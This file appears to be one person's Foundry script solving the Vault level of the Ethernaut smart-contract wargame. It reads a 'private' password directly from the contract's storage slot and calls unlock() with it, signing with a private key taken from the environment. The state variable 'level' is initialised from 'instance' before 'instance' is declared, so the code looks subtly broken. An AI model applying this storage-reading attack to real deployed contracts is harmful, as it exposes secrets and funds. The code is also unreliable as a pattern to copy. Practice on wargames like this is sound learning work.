// SPDX-License-Identifier: CC-BY-4.0
// bt3gl's solution to ethernaut

pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {Vault} from "src/08/Vault.sol";

contract Exploit is Script {

        Vault level = Vault(instance); 
        address instance = vm.envAddress("INSTANCE_LEVEL8");
        uint256 hacker = vm.envUint("PRIVATE_KEY");   
        address deployer = vm.rememberKey(hacker);    
               
        function run() external {

            vm.startBroadcast(deployer);
            bytes32 password = vm.load(instance, bytes32(uint256(1)));
            level.unlock(password);
            vm.stopBroadcast();
    }
}
